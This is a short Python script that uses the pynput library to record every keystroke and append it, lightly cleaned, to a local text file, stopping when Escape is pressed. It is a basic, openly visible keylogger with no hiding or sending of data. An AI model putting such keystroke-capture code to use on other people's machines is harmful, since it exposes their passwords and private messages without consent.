import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def write_file(keyslist):
    with open("file.txt", "a") as f:
         for i in keyslist:
             i = i.replace("Key.space", "\n")
             i = i.replace("Key.shift", "")
             i = i.replace("Key.esc", "\n")
             i = i.replace("Key.enter", "\n")
             i = i.replace("Key.backspace", " backspace ")
             i = i.replace("'", "")
             f.write(i)

def on_press(key):
    global keys, count
    
    keys.append(str(key))
    count += 1
    #print("you pressed {}".format(key))
    
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def on_release(key):
    if key == Key.esc:
        return False
        
print("click esc to exit...")
        
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    


